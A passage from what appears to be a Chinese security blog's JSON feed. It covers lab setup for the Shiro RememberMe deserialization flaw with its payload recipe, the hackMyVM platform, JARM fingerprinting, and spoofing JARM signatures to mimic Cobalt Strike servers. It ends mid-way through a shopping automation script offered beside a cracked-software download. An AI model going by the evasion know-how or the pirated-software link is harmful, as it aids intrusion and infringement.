            "content_html": "<h1 id=\"shiro反序列化漏洞分析起始篇\"><a class=\"anchor\" href=\"#shiro反序列化漏洞分析起始篇\">#</a> shiro 反序列化漏洞分析起始篇</h1>\n<h2 id=\"shiro框架\"><a class=\"anchor\" href=\"#shiro框架\">#</a> Shiro 框架</h2>\n<h3 id=\"框架介绍\"><a class=\"anchor\" href=\"#框架介绍\">#</a> 框架介绍</h3>\n<blockquote>\n<p>Apache Shiro™ is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. With Shiro’s easy-to-understand API, you can quickly and easily secure any application – from the smallest mobile applications to the largest web and enterprise applications.<br />\nApache Shiro™是一个强大且易用的 Java 安全框架，能够用于身份验证、授权、加密和会话管理。Shiro 拥有易于理解的 API, 您可以快速、轻松地获得任何应用程序 —— 从最小的移动应用程序到最大的网络和企业应用程序。</p>\n</blockquote>\n<p>简而言之，Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p>\n<h2 id=\"漏洞原理\"><a class=\"anchor\" href=\"#漏洞原理\">#</a> 漏洞原理</h2>\n<p>Apache Shiro 框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的 cookie。在服务端对 rememberMe 的 cookie 值，先 base64 解码然后 AES 解密再反序列化，就导致了反序列化 RCE 漏洞。</p>\n<p>在服务端接收 cookie 值时，按以下步骤解析：</p>\n<pre><code>检索RemeberMe cookie的值\n\nBase64解码\n\n使用ACE解密（加密密钥硬编码）\n\n进行反序列化操作（未作过滤处理）\n</code></pre>\n<p>Payload 过程：<br />\n命令 =&gt; 序列化 =&gt;AES 加密 =&gt;base64 编码 =&gt;RememberMe Cookie 值</p>\n<p>在整个漏洞利用过程中，比较重要的是 AES 加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了，Payload 构造起来也是十分的简单。</p>\n<p>总结一下：就是服务器在接收到 Client 的请求后会获取 Cookie 中的 RemeberMe 字段然后进行固定格式的解码然后对解码数据进行反序列化最终导致远程代码执行。</p>\n<h2 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>tomcat 8.5.76 <span class=\"exturl\" data-url=\"aHR0cHM6Ly90b21jYXQuYXBhY2hlLm9yZy8=\"> (下载地址：Apache Tomcat® - Welcome!)</span></p>\n<p>JDK 1.7 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UvamF2YXNlNy1hcmNoaXZlLWRvd25sb2Fkcy5odG1s\">（下载地址：Java Archive Downloads - Java SE 7）</span></p>\n<p>shiro 源码（下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2FwYWNoZS9zaGlyby96aXAvc2hpcm8tcm9vdC0xLjIuNCVFRiVCQyU4OQ==\">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4）</span></p>\n<blockquote>\n<p>tomcat 和 JDK 下载备用</p>\n</blockquote>\n<h3 id=\"下载shiro源码将压缩包解压后使用idea打开\"><a class=\"anchor\" href=\"#下载shiro源码将压缩包解压后使用idea打开\">#</a> 下载 shiro 源码，将压缩包解压后使用 IDEA 打开</h3>\n<p>打开  <code>samples\\web\\pom.xml</code> <br />\n<img data-src=\"https://s2.loli.net/2022/10/28/zODbxr5iRuNZc2f.png\" alt=\"shiro1.png\" /><br />\n 指定 javax.servlet 依赖包的版本为 1.2（如果不指定版本，会报无法解析 jsp 的 500 错误）</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>javax.servlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>jstl<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>1.2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>scope</span><span class=\"token punctuation\">></span></span>runtime<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>scope</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>修改好后在 pom 文件右击然后选择重新加载 Maven 项目或者直接点击文件右上角的小标志</p>\n<h3 id=\"指定jdk\"><a class=\"anchor\" href=\"#指定jdk\">#</a> 指定 JDK</h3>\n<p>打开项目结构，添加 SDK ，选择我们之前下载的 JDK1.7<br />\n<img data-src=\"https://s2.loli.net/2022/10/28/FjJarSlbfdEPZoy.png\" alt=\"jdk1.png\" /><br />\n 更改项目的 SDK<br />\n<img data-src=\"https://s2.loli.net/2022/10/28/cyJ1DzrLT8AuoYl.png\" alt=\"jdk2.png\" /></p>\n<h3 id=\"tomcat-配置\"><a class=\"anchor\" href=\"#tomcat-配置\">#</a> tomcat 配置</h3>\n<p>点击右上角添加项目<br />\n<img data-src=\"https://s2.loli.net/2022/10/28/Qa3P9uLdyRGDx2s.png\" alt=\"2.png\" /><br />\n 添加一个本地的 Tomcat 项目<br />\n<img data-src=\"https://s2.loli.net/2022/10/28/iYOEV2ADMm81TXy.png\" alt=\"3.png\" /><br />\n 添加项目部署<br />\n<img data-src=\"https://s2.loli.net/2022/10/28/fLJTGYokj4ph1AK.png\" alt=\"4.png\" /><br />\n 选择 sample-web 项目<br />\n<img data-src=\"https://s2.loli.net/2022/10/28/V7eHjzYUZuPkCGq.png\" alt=\"5.png\" /><br />\n<img data-src=\"https://s2.loli.net/2022/10/28/VoqruNiZcSvAmdP.png\" alt=\"6.png\" /><br />\n 确定后运行项目<br />\n运行项目后可以在下面的服务小工具栏的服务看到服务部署情况<br />\n如果打开项目成功那么会自动打开默认配置的浏览器</p>\n<p><img data-src=\"https://s2.loli.net/2022/10/28/CfOBmnN4M1ZiLw7.png\" alt=\"7.png\" /></p>\n<h1 id=\"完结\"><a class=\"anchor\" href=\"#完结\">#</a> 完结</h1>\n<p>下篇来分析为何会产生安安全问题</p>\n",
            "tags": [
                "网络安全",
                "JAVA安全",
                "反序列化",
                "漏洞复现"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/26/hackMyVM%E6%A6%82%E8%BF%B0/",
            "url": "http://zhyzhyzhy.cn/2022/10/26/hackMyVM%E6%A6%82%E8%BF%B0/",
            "title": "hackMyVM概述",
            "date_published": "2022-10-25T16:00:00.000Z",
            "content_html": "<h1 id=\"hackmyvm概述\"><a class=\"anchor\" href=\"#hackmyvm概述\">#</a> hackmyvm 概述</h1>\n<p>hackmyvm 是一个平台，包含了大量靶机，类似于 vulnhub、hackthebox 等平台，你可以在上面下载靶机，进行渗透测试练习，非常适合热爱黑客技术或从事渗透测试的人员。</p>\n<h2 id=\"hackmyvm能玩什么\"><a class=\"anchor\" href=\"#hackmyvm能玩什么\">#</a> hackMyVM 能玩什么？</h2>\n<p>离线的，现在的 hackMyVM 具有 159 台离线靶机，你可以下载下来慢慢享受。<br />\n<img data-src=\"https://s2.loli.net/2022/10/26/FAYtVEnqrecw26x.png\" alt=\"1.png\" /><br />\n 在线的，hackMyVM 还提供了两种不同的在线靶场，你大可以什么都不用下载，来享受 hackMyVM 提供的快乐。<br />\n<img data-src=\"https://s2.loli.net/2022/10/26/Gre6QVYLU7MBRsC.png\" alt=\"2.png\" /></p>\n<p>活跃度，相比于 vulnhub 来看，hackMyVM 始终保持着活跃度，每周都会上线靶机。从下方可以看出，vulnhub 最早的更新在 2021 年十一月，而 hackMyVM 则是在不久前进行了更新。当然！你也可以上线自己的靶机供他人使用。<br />\n<img data-src=\"https://s2.loli.net/2022/10/26/WKSGhRAlwHLmvk6.png\" alt=\"4.png\" /><br />\n<img data-src=\"https://s2.loli.net/2022/10/26/fqLxjZ6sJuBgNaC.png\" alt=\"5.png\" /></p>\n<p>如果你遇到了困难，不要担心，hackMyVM 官方提供了社区聊天群，你可以在社区群中进行提问也可以来帮助他人。<br />\n<img data-src=\"https://s2.loli.net/2022/10/26/AjgtoEFwV34bPmH.png\" alt=\"3.png\" /></p>\n",
            "tags": [
                "Linux",
                "CTF",
                "打靶",
                "hackMyVM"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/24/JARM%E6%AC%BA%E9%AA%97/",
            "url": "http://zhyzhyzhy.cn/2022/10/24/JARM%E6%AC%BA%E9%AA%97/",
            "title": "JARM签名欺骗， 我现在是 Cobalt Strike 服务器！",
            "date_published": "2022-10-23T18:00:00.000Z",
            "content_html": "<h1 id=\"jarm签名欺骗\"><a class=\"anchor\" href=\"#jarm签名欺骗\">#</a> JARM 签名欺骗</h1>\n<p>JARM 是非常有用的指纹识别工具，但可以通过从其他服务重放服务器 hello 来欺骗。</p>\n<p>JARM 扫描器是一种非常有效的系统指纹识别工具。它使用来自 TLS 握手的 Server Hello 响应来生成签名。然后可以使用这些来查找类似的软件或服务。非常适合查找 C2 或其他实施 TLS 的恶意服务器。因此，shodan.io 在其扫描仪中使用这种指纹识别机制也就不足为奇了。阅读<a href=\"http://zhyzhyzhy.cn:7001/2022/10/24/JARM%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/\"> JARM 指纹识别</a>相关的帖子，了解更过的知识。</p>\n<h2 id=\"那么问题来了是否有可能欺骗这些-jarm-签名让我们来了解一下\"><a class=\"anchor\" href=\"#那么问题来了是否有可能欺骗这些-jarm-签名让我们来了解一下\">#</a> 那么问题来了：是否有可能欺骗这些 JARM 签名？让我们来了解一下！</h2>\n<p>我们知道，扫描 Cobalt Strike 服务器会产生以下签名 07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1</p>\n<p>Cobalt Strike 博客中揭示了此签名不是 Cobalt Strike 特有的。无论如何，让我们仍然使用它作为起点。</p>\n<p>首先，我可以使用资产测绘工具来查找具有匹配哈希的服务器。使用 jarmscan 对其进行了扫描，并创建了响应的数据包捕获。Wireshark 中的 ssl 握手 (filter:ssl.handshake.type == 1) 过滤器将显示扫描仪发送的所有 TLS 客户端 Hello。</p>\n<p><img data-src=\"https://image.3001.net/images/20220525/1653481427_628e1fd3c9eeeb9ef30e9.png!small\" alt=\"12\" /></p>\n<p>反过来，“Cobalt Strike” 服务器将返回其服务器 Hello。jarmscan 将使用它们生成唯一的签名（filter:ssl.handshake.type==2）。</p>\n<p><img data-src=\"https://image.3001.net/images/20220525/1653481415_628e1fc77d3fefa687987.png!small\" alt=\"\" /><br />\n这些 Server Hello 是我们想要重放的数据包。这可以通过设置一个监听特定 Client Hello 的 TCP 服务器轻松完成，然后重播从所谓的 Cobalt Strike 服务器捕获的相应 Server Hello。一种相当方便但有效的方法。</p>\n<blockquote>\n<p>参考文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzMzNDI5OC5odG1s\">https://www.freebuf.com/articles/web/334298.html</span></p>\n</blockquote>\n",
            "tags": [
                "网络安全",
                "技术干货",
                "黑客"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/24/JARM%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/",
            "url": "http://zhyzhyzhy.cn/2022/10/24/JARM%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/",
            "title": "JARM 指纹识别",
            "date_published": "2022-10-23T17:00:00.000Z",
            "content_html": "<h2 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍：</h2>\n<p>JARM 是一个活动的传输层安全 (TLS) 服务器指纹识别工具。</p>\n<p>使用 JARM 进行扫描提供了识别和分组 Internet 上的恶意服务器的能力。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbGVzZm9yY2UvamFybQ==\">JARM tools</span></p>\n<h2 id=\"jarm-指纹可用于\"><a class=\"anchor\" href=\"#jarm-指纹可用于\">#</a> JARM 指纹可用于：</h2>\n<p>快速验证组中的所有服务器是否具有相同的 TLS 配置。</p>\n<p>通过配置对 Internet 上的不同服务器进行分组，例如，识别服务器可能属于 Google、Salesforce 和 Apple。</p>\n<p>识别默认应用程序或基础架构。</p>\n<p>识别 Internet 上的恶意软件命令和控制基础设施以及其他恶意服务器。</p>\n<h2 id=\"本文中您将了解到\"><a class=\"anchor\" href=\"#本文中您将了解到\">#</a> 本文中，您将了解到：</h2>\n<p>JARM 是如何工作的。</p>\n<p>如何使用 JARM 来识别恶意服务器。</p>\n<p>从被动网络安全黑名单转变为主动网络安全黑名单。</p>\n<p>如何将 JARM 部署到您的检测和响应管道中。</p>\n<p>JARM 如何用于配置验证和应用程序识别。</p>\n<h2 id=\"jarm-的工作原理\"><a class=\"anchor\" href=\"#jarm-的工作原理\">#</a> JARM 的工作原理</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>zhy@zhy jarm<span class=\"token punctuation\">]</span>$ python jarm.py <span class=\"token parameter variable\">-V</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>JARM version <span class=\"token number\">1.0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>zhy@zhy jarm<span class=\"token punctuation\">]</span>$ python jarm.py <span class=\"token parameter variable\">-h</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>usage: jarm.py <span class=\"token punctuation\">[</span>-h<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-i INPUT<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-p PORT<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-v<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-V<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-o OUTPUT<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-j<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-P PROXY<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>scan<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Enter an IP address and port to scan.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>positional arguments:</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  scan                  Enter an IP or domain to scan.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>options:</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  -h, <span class=\"token parameter variable\">--help</span>            show this <span class=\"token builtin class-name\">help</span> message and <span class=\"token builtin class-name\">exit</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token parameter variable\">-i</span> INPUT, <span class=\"token parameter variable\">--input</span> INPUT</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                        Provide a list of IP addresses or domains to scan, one domain or IP address per line. Optional:</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                        Specify port to scan with comma separation <span class=\"token punctuation\">(</span>e.g. <span class=\"token number\">8.8</span>.4.4,853<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token parameter variable\">-p</span> PORT, <span class=\"token parameter variable\">--port</span> PORT  Enter a port to scan <span class=\"token punctuation\">(</span>default <span class=\"token number\">443</span><span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  -v, <span class=\"token parameter variable\">--verbose</span>         Verbose mode: displays the JARM results before being hashed.</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  -V, <span class=\"token parameter variable\">--version</span>         Print out version and exit.</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token parameter variable\">-o</span> OUTPUT, <span class=\"token parameter variable\">--output</span> OUTPUT</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                        Provide a filename to output/append results to a CSV file.</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  -j, <span class=\"token parameter variable\">--json</span>            Output ndjson <span class=\"token punctuation\">(</span>either to <span class=\"token function\">file</span> or stdout<span class=\"token punctuation\">;</span> overrides <span class=\"token parameter variable\">--output</span> defaults to CSV<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token parameter variable\">-P</span> PROXY, <span class=\"token parameter variable\">--proxy</span> PROXY</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                        To use a SOCKS5 proxy, provide address:port.</pre></td></tr></table></figure><p>在学习 JARM 的工作原理之前，了解 TLS 的工作原理很重要。TLS 及其前身 SSL 用于加密常见应用程序（如 Internet 浏览器）的通信，以确保数据安全，也用于加密恶意软件，因此它可以进行隐藏在噪声中。中要启动 TLS 会话，客户端将在 TCP 三次握手之后发送 TLS Client Hello 消息。此数据包及其生成方式取决于构建客户端应用程序时使用的包和方法。服务器如果接受 TLS 连接，将使用 TLS Server Hello 数据包进行响应。<br />\n<img data-src=\"https://image.3001.net/images/20220525/1653482074_628e225a76d41370b9f7d.gif!small\" alt=\"\" /><br />\nTLS 服务器根据在 TLS 客户端 Hello 数据包中接收到的详细信息制定其服务器 Hello 数据包。根据应用程序或服务器的构建方式，服务器回复 Hello 的方式可能会有所不同，包括：</p>\n<pre><code>    操作系统\n\n    操作系统版本\n\n    使用的库\n\n    使用的这些库的版本\n\n    调用库的顺序\n\n    自定义配置\n</code></pre>\n<p>所有这些因素导致每个 TLS 服务器以独特的方式响应。各种因素的组合使得不同组织部署的服务器不太可能有相同的响应。</p>\n<p>下面是在<span class=\"exturl\" data-url=\"aHR0cHM6Ly93aXJlc2hhcmsuY29tLw==\"> Wireshark</span> 中查看的 TLS 客户端 Hello 和服务器 Hello 的示例。<br />\n<img data-src=\"https://image.3001.net/images/20220525/1653481840_628e2170c35b715852943.png!small\" alt=\"\" /></p>\n<p><img data-src=\"https://image.3001.net/images/20220525/1653481847_628e2177e27d38ad629ca.png!small\" alt=\"\" /><br />\nJARM 通过主动向目标 TLS 服务器发送 10 个 TLS 客户端 Hello 数据包并捕获 TLS 服务器 Hello 响应的特定属性来工作。然后以特定方式对聚合的 TLS 服务器响应进行哈希处理以生成 JARM 指纹。</p>\n<p>JARM 中的 10 个 TLS 客户端 Hello 数据包经过特殊设计，可在 TLS 服务器中提取唯一响应。JARM 以不同的顺序发送不同的 TLS 版本、密码和扩展，以收集唯一的响应。服务器是否支持 TLS 1.3？ 它会与 1.2 密码协商 TLS 1.3 吗？如果我们将密码从最弱到最强排序，它会选择哪个密码？这些是 JARM 本质上要求服务器提取最独特的响应的不寻常问题的类型。然后对 10 个响应进行哈希处理以生成 JARM 指纹。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>zhy@zhy-f0 jarm<span class=\"token punctuation\">]</span>$ python jarm.py <span class=\"token parameter variable\">-v</span> baidu.com</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Domain: baidu.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Resolved IP: <span class=\"token number\">220.181</span>.38.251</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>JARM: 29d29d00029d29d1fc29d29d29d29d881e59db99b9f67f908be168829ecef9</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Scan <span class=\"token number\">1</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">|</span>http/1.1<span class=\"token operator\">|</span>ff01-000b-0023-0010,</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Scan <span class=\"token number\">2</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">|</span>http/1.1<span class=\"token operator\">|</span>ff01-000b-0023-0010,</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Scan <span class=\"token number\">3</span>: <span class=\"token operator\">||</span><span class=\"token operator\">|</span>,</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Scan <span class=\"token number\">4</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">||</span>ff01-000b-0023,</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Scan <span class=\"token number\">5</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">||</span>ff01-000b-0023,</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Scan <span class=\"token number\">6</span>: c011<span class=\"token operator\">|</span>0302<span class=\"token operator\">|</span>http/1.1<span class=\"token operator\">|</span>ff01-000b-0023-0010,</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Scan <span class=\"token number\">7</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">|</span>http/1.1<span class=\"token operator\">|</span>ff01-000b-0023-0010,</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Scan <span class=\"token number\">8</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">|</span>http/1.1<span class=\"token operator\">|</span>ff01-000b-0023-0010,</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Scan <span class=\"token number\">9</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">|</span>http/1.1<span class=\"token operator\">|</span>ff01-000b-0023-0010,</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Scan <span class=\"token number\">10</span>: c02f<span class=\"token operator\">|</span>0303<span class=\"token operator\">|</span>http/1.1<span class=\"token operator\">|</span>ff01-000b-0023-0010</pre></td></tr></table></figure><p><img data-src=\"https://image.3001.net/images/20220525/1653481819_628e215bd6ed388c654e2.png!small\" alt=\"\" /><br />\n<img data-src=\"https://image.3001.net/images/20220525/1653481826_628e2162959126319791b.png!small\" alt=\"\" /></p>\n<p>在收到每个 TLS 服务器问候消息后，JARM 会使用 FIN 优雅地关闭连接，以免套接字打开。</p>\n<h2 id=\"jarm-示例\"><a class=\"anchor\" href=\"#jarm-示例\">#</a> JARM 示例：</h2>\n<table>\n<thead>\n<tr>\n<th>Domain</th>\n<th>JARM</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL3NhbGVzZm9yY2UuY29t\">salesforce.com</span></td>\n<td>2ad2ad0002ad2ad00042d42d00000069d641f34fe76acdc05c40262f8815e5</td>\n</tr>\n<tr>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL2ZvcmNlLmNvbQ==\">force.com</span></td>\n<td>2ad2ad0002ad2ad00042d42d00000069d641f34fe76acdc05c40262f8815e5</td>\n</tr>\n<tr>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL2dvb2dsZS5jb20=\">google.com</span></td>\n<td>27d40d40d29d40d1dc42d43d00041d4689ee210389f4f6b4b5b1b93f92252d</td>\n</tr>\n<tr>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL2ZhY2Vib29rLmNvbQ==\">facebook.com</span></td>\n<td>27d40d40d29d40d1dc42d43d00041d4689ee210389f4f6b4b5b1b93f92252d</td>\n</tr>\n<tr>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL2luc3RhZ3JhbS5jb20=\">instagram.com</span></td>\n<td>27d27d27d29d27d1dc41d43d00041d741011a7be03d7498e0df05581db08a9</td>\n</tr>\n<tr>\n<td><span class=\"exturl\" data-url=\"aHR0cDovL29jdWx1cy5jb20=\">oculus.com</span></td>\n<td>27d27d27d29d27d1dc41d43d00041d741011a7be03d7498e0df05581db08a9</td>\n</tr>\n</tbody>\n</table>\n<p>需要注意的是，JARM 是一种高性能指纹功能，不应将其视为或与安全加密功能混淆。</p>\n<h2 id=\"如何使用-jarm-识别恶意服务器\"><a class=\"anchor\" href=\"#如何使用-jarm-识别恶意服务器\">#</a> 如何使用 JARM 识别恶意服务器</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YW5nemhhbi4zNjAuY24vMjk2Lmh0bWw=\">https://wangzhan.360.cn/296.html</span></p>\n<blockquote>\n<p>本文转载：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8zMzQyOTkuaHRtbA==\">https://www.freebuf.com/sectool/334299.html</span></p>\n</blockquote>\n",
            "tags": [
                "网络安全",
                "技术干货",
                "黑客"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/24/2022%E5%8F%8C%E5%8D%81%E4%B8%80%E5%B0%8F%E8%84%9A%E6%9C%AC/",
            "url": "http://zhyzhyzhy.cn/2022/10/24/2022%E5%8F%8C%E5%8D%81%E4%B8%80%E5%B0%8F%E8%84%9A%E6%9C%AC/",
            "title": "【2022年】一键完成淘宝/京东双十一活动脚本",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<p>有到一年一度的双十一了，想不想解放双手</p>\n<h1 id=\"声明\"><a class=\"anchor\" href=\"#声明\">#</a> 声明</h1>\n<blockquote>\n<p><em><strong>仅供个人使用、禁止商用，请勿用于薅羊毛非法倒卖等违法行为，由此产生的法律后果需自行承担，阅读下文代表认同以上协议。</strong></em></p>\n</blockquote>\n<h1 id=\"教程\"><a class=\"anchor\" href=\"#教程\">#</a> 教程</h1>\n<h2 id=\"andriod用户使用autojs管理脚本\"><a class=\"anchor\" href=\"#andriod用户使用autojs管理脚本\">#</a> Andriod 用户：使用 AutoJS 管理脚本</h2>\n<p>如果您想在电脑上完成下述操作，您也可以安装模拟器（但是部分模拟器可能会出现京东、淘宝安装之后打不开的情况，因此还是强烈建议使用真机）</p>\n<blockquote>\n<p>(无法下载使用右击新建标签打开)</p>\n</blockquote>\n<p><a href=\"https://zhyzhyzhy.cn/file/autojs4.1.1.apk\">AutoJS 免费版下载</a><br />\n<a href=\"https://zhyzhyzhy.cn/file/Auto.js%20Prov7.0.8-3%5B%E5%85%8D%E7%99%BB%E5%BD%95Pro%E7%89%88%5D.apk\"> AutoJS pro7.0.8 破解版下载</a><br />\n<a href=\"https://zhyzhyzhy.cn/file/MuMuInstaller_1.2.1.0_nochannel_zh-Hans_1632466157.exe\">网易 MuMu 模拟器下载</a><br />\n<strong>阿里云盘</strong><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvaDE0YVlQUW50bkw=\"> https://www.aliyundrive.com/s/h14aYPQntnL</span><br />\n 提取码: c6r9<br />\n2022 年京东双十一最新脚本，点击👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmFpZHUuY29t\">如何使用脚本</span></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> sleepTime <span class=\"token operator\">=</span> <span class=\"token number\">500</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> speed <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 任务序号</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token constant\">TASK_ID</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">const</span> appPackageName <span class=\"token operator\">=</span> <span class=\"token string\">\"com.jingdong.app.mall\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 忽略任务</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">IGNORE_TASK_LIST</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'授权信息'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'确认授权'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'下单再得'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">BACK_LIST</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'获得8000金币'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'获得7000金币'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'获得4000金币'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'获得3000金币'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 